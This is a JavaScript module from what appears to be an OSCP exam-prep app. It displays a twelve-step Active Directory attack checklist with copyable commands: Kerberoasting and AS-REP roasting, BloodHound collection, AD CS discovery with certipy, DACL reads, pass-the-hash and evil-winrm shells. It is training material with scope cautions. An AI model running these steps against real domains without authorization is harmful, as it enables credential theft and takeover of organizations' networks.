/* V34.59 — AD winning steps, offline/target-aware. No network calls; commands are copied, never executed. */
(function(){
 'use strict';
 if(window.__OSCP_AD_WIN_STEPS__)return;
 window.__OSCP_AD_WIN_STEPS__=true;
 const STEPS=[
  {id:'context',title:'1. DC / DNS / time / scope baseline',why:'Kerberos and LDAP errors are meaningless until the controller, route, FQDN and time context are correct. If no credentials exist, enumerate anonymously only where allowed.',cmd:[
   'export DOMAIN="domain.local"',
   'export DC="dc01.domain.local"',
   'export DC_IP="10.10.10.10"',
   'getent hosts "$DC"',
   'dig @"$DC_IP" _ldap._tcp.dc._msdcs."$DOMAIN" SRV +short',
   'date -u',
   'nmap -Pn -n -p 53,88,135,139,389,445,464,636,3268,3389,5985,5986 "$DC_IP" -oA ad-dc-baseline'
  ].join('\n'),anchor:'ref-9-0a-issued-domain-credential-first-ten-minutes'},
  {id:'initial',title:'2. Prove the starting identity or anonymous access',why:'Issued username/password, a validated hash/ticket, anonymous SMB/LDAP or a domain-joined shell are different starting points. Do not infer authorization or spray passwords.',cmd:[
   'export AUTH_USER="issued.user"',
   'export AUTH_PASS="replace-with-issued-secret"',
   'nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"',
   'nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"',
   '# No credentials? Test only permitted anonymous exposure:',
   'smbclient -L "//$DC_IP/" -N'
  ].join('\n'),anchor:'ref-9-2-unauthenticated-enumeration'},
  {id:'visibility',title:'3. Shares, users, groups and reachable member hosts',why:'Read permissions and actual host access before choosing a technique; an authenticated [+] is not administrative execution.',cmd:[
   'nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares',
   'nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --users',
   'nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --groups',
   'nxc smb "$MEMBER_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --shares',
   '# Set MEMBER_IP only after learning an actual in-scope member host.'
  ].join('\n'),anchor:'ref-9-0a-issued-domain-credential-first-ten-minutes'},
  {id:'kerberos',title:'4. Targeted Kerberos opportunities',why:'Request tickets only for discovered user/SPN candidates. AS-REP material requires pre-authentication disabled; PREAUTH_REQUIRED is not a roastable hash.',cmd:[
   'impacket-GetUserSPNs "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -request -outputfile kerberoast.txt',
   '# After confirming actual usernames (users.txt):',
   'impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -no-pass -usersfile users.txt -request -outputfile asrep.txt',
   '# Save material; offline cracking is conditional on an actual suitable hash.'
  ].join('\n'),anchor:'ref-9-4-kerberos-attacks'},
  {id:'graph',title:'5. BloodHound: collect → inspect controlled edges',why:'Collect the graph under your current real identity; start at your controlled principal, then validate each promising outgoing edge manually.',cmd:[
   'bloodhound-ce-python -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" -dc "$DC" -ns "$DC_IP" -c All --zip',
   '# Import the ZIP to your local BloodHound CE instance.',
   '# Examine current principal → group/computer/object control, not generic shortest paths.'
  ].join('\n'),anchor:'ref-9-6-ad-attack-path-methodology-build-the-graph-don-t-just-run-tools'},
  {id:'certs',title:'6. AD CS only when CA/template exists',why:'An ESC label is a hypothesis. Check CA presence, enabled template, effective enrollment permissions, target identity and authentication prerequisites.',cmd:[
   'certipy find -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout',
   '# No CA, no actionable enrollment/control, or missing prerequisite? Park this branch.',
   '# Re-check local certipy --help if installed syntax differs.'
  ].join('\n'),anchor:'ref-9-7-ad-cs-esc1-esc17-decision-tree'},
  {id:'control',title:'7. Prove actual ACL/group/object control',why:'An edge does not grant an instant shell. Identify source principal, target object, exact right, effective context and a reversible plan.',cmd:[
   '# Record a real graph edge first: SOURCE_PRINCIPAL → EDGE_TARGET and right.',
   'bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET"',
   '# DACL/owner read operations where that edge warrants them:',
   'impacket-dacledit -action read -principal "$SOURCE_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"',
   '# Save current group members/owner/DACL before a write.'
  ].join('\n'),anchor:'ref-9-7-acl-dacl-abuse'},
  {id:'material',title:'8. Credential material → one justified protocol',why:'Password, NTLM hash, ccache, certificate and SSH key are not interchangeable. Prove authentication separately from admin rights and interactive access.',cmd:[
   'nxc smb "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"',
   '# If an NTLM hash was actually recovered: nxc smb "$TARGET_HOST" -u "$AUTH_USER" -H "$NT_HASH" -d "$DOMAIN"',
   '# If a Kerberos ticket was actually recovered: inspect klist / KRB5CCNAME and use the matching protocol',
   '# Only check WinRM/RDP/SMB exec when the service AND logon rights have been demonstrated.'
  ].join('\n'),anchor:'ref-9-6c-v19-credential-material-router'},
  {id:'edge',title:'9. Execute ONE validated edge; prove result and rollback',why:'Use the minimum change after saving pre-state. A graph label or tool success is not the resulting privilege: re-read the object, refresh the session and verify.',cmd:[
   '# Select the exact supported edge in the BloodHound execution desk.',
   '# BEFORE: source principal, exact object, current state, required right, backup.',
   '# ACTION: minimum justified mutation (if any), no blind password resets.',
   '# AFTER: verify resulting rights/access and restore any temporary change.',
   '# Open the detailed edge planner rather than guessing a generic write command.'
  ].join('\n'),anchor:'ref-9-6b-v19-bloodhound-edge-execution-desk'},
  {id:'member',title:'10. Prove one member-host shell or admin access',why:'A successful SMB bind is not a shell. Prefer an in-scope member host with proven logon/exec rights, then baseline the actual token.',cmd:[
   'nxc smb "$MEMBER_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"',
   'nxc winrm "$MEMBER_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"',
   '# When WinRM rights are proven:',
   'evil-winrm -i "$MEMBER_IP" -u "$AUTH_USER" -p "$AUTH_PASS"',
   '# At every new shell: whoami /all ; hostname ; ipconfig /all'
  ].join('\n'),anchor:'ref-9-6-ad-attack-path-methodology-build-the-graph-don-t-just-run-tools'},
  {id:'pivot',title:'11. New identity / shell → local privesc → re-collect',why:'Every new token, hash, ticket, certificate, route or privileged session may open a different edge. Do Windows local privesc where necessary, then recollect graph and rights.',cmd:[
   '# On new Windows shell:',
   'whoami /all',
   'cmdkey /list',
   'netstat -ano',
   '# Open WIN Windows for services, tasks, token, secrets and SYSTEM.',
   '# Re-collect BloodHound / AD CS with new effective credentials.'
  ].join('\n'),anchor:'ref-13-0-v16-windows-post-shell-workflow'},
  {id:'finish',title:'12. Domain objective → bank proof → record reproduction',why:'Only claim the objective actually proven. Preserve interactive proof, host/IP, principal/privilege, reversible changes, commands and evidence before moving on.',cmd:[
   'whoami /all',
   'hostname',
   'ipconfig /all',
   '# Read local.txt/proof.txt from its original location in your interactive target shell.',
   '# Submit exact proof in the exam panel, save screenshot with target IP, and record full path.',
   '# Do not assume a BloodHound path alone means domain compromise.'
  ].join('\n'),anchor:'ref-9-6-domain-compromise-final-steps'}
 ];
 let progress=safeStoredRecord(STORE+'adWinningSteps',{});
 const key=()=>$('#adStrategyTarget')?.value||activeTargetId||'__unassigned__';
 function save(){safeStoreSet(STORE+'adWinningSteps',JSON.stringify(progress));v9Dirty=true;}
 function render(){
  const sel=$('#adStrategyTarget'),body=$('#adStrategyBody');if(!sel||!body)return;
  const old=sel.value;
  sel.replaceChildren(new Option('No exam target selected','__unassigned__'),...targets.map(t=>new Option(targetLabel(t),t.id)));
  sel.value=old&&[...sel.options].some(o=>o.value===old)?old:(activeTargetId&&targets.some(t=>t.id===activeTargetId)?activeTargetId:'__unassigned__');
  const current=key(),done=progress[current]||{};
  const nodes=STEPS.map(s=>{
   const card=document.createElement('div');card.className='winStrategyStep'+(done[s.id]?' done':'');
   const head=document.createElement('div');head.className='row';head.style.justifyContent='space-between';head.style.alignItems='flex-start';
   const label=document.createElement('label'),input=document.createElement('input');input.type='checkbox';input.className='adStrategyCheck';input.checked=!!done[s.id];input.dataset.step=s.id;
   const b=document.createElement('b');b.textContent=s.title;label.append(input,document.createTextNode(' '),b);
   const actions=document.createElement('div');actions.className='row';
   const copy=document.createElement('button');copy.type='button';copy.className='btn adStrategyCopy';copy.dataset.step=s.id;copy.textContent='Copy';
   const ref=document.createElement('button');ref.type='button';ref.className='btn adStrategyRef';ref.dataset.ref=s.anchor;ref.textContent='Ref →';
   actions.append(copy,ref);head.append(label,actions);
   const why=document.createElement('div');why.className='winStrategyWhy';why.textContent=s.why;
   const pre=document.createElement('pre');pre.className='winStrategyCmd';pre.textContent=s.cmd;
   card.append(head,why,pre);return card;
  });
  body.replaceChildren(...nodes);
  body.querySelectorAll('.adStrategyCheck').forEach(el=>el.onchange=()=>{
   const k=key();progress[k]=progress[k]||{};progress[k][el.dataset.step]=el.checked;save();render();
  });
  body.querySelectorAll('.adStrategyCopy').forEach(el=>el.onclick=async()=>{
   const s=STEPS.find(x=>x.id===el.dataset.step);if(s)await guardedCopyText(sanitizeUnicode(s.cmd),'AD winning-step command',null,{allowPlaceholders:true});
  });
  body.querySelectorAll('.adStrategyRef').forEach(el=>el.onclick=()=>openRef(el.dataset.ref));
  const count=STEPS.filter(s=>done[s.id]).length;
  $('#adStrategyDone').textContent=count+'/'+STEPS.length;
  $('#adStrategyPct').textContent=Math.round(count/STEPS.length*100)+'%';
  const hint=$('#adStrategyTargetHint'),target=targets.find(t=>t.id===current);
  hint.replaceChildren();
  if(target){
   const name=document.createElement('b');name.textContent=targetLabel(target);
   hint.append(document.createTextNode('Selected: '),name);
   if(!['dc','ad-member','windows'].includes(target.role)){
    const note=document.createElement('span');note.className='tiny';note.textContent=' Role is not marked AD/Windows; validate the actual target before following this workflow.';
    hint.append(note);
   }
  }else hint.textContent='Select or add your current AD exam target to save progress separately.';
 }
 $('#adStrategyTarget')?.addEventListener('change',render);
 $('#adStrategyReset')?.addEventListener('click',()=>{
  const k=key();if(confirm('Reset the AD winning steps for this target?')){delete progress[k];save();render();}
 });
 $('#adStrategyBank')?.addEventListener('click',()=>$('#examBankBtn')?.click());
 $('#adStrategyWin')?.addEventListener('click',()=>switchView('windowsStrategyView'));
 $('#adStrategyTools')?.addEventListener('click',()=>{
  switchView('windowsStrategyView');
  setTimeout(()=>$('#v20AdFallbackToolbox')?.scrollIntoView({block:'start'}),30);
 });
 const originalSwitch=switchView;
 switchView=function(id){originalSwitch(id);if(id==='adStrategyView')render();};
 const originalSession=sessionPayload;
 sessionPayload=function(includeSecrets=false){const o=originalSession(includeSecrets);o.adWinningSteps=progress;return o;};
 const originalRestore=restoreV9Payload;
 restoreV9Payload=function(o){
  if(o?.adWinningSteps&&typeof o.adWinningSteps==='object'&&!Array.isArray(o.adWinningSteps))progress=o.adWinningSteps;
  originalRestore(o);save();render();
 };
 try{V16_SELF_TESTS.push(
  ['AD winning steps complete',()=>[STEPS.length===12&&STEPS.every(s=>['id','title','why','cmd','anchor'].every(k=>String(s[k]||'').trim())),'12 AD phases']],
  ['AD winning-step backup',()=>[sessionPayload(false).adWinningSteps===progress,'per-target state included']]
 );}catch(e){}
 window.OSCP_AD_WINNING_STEPS={steps:STEPS,render:render};
 render();
})();
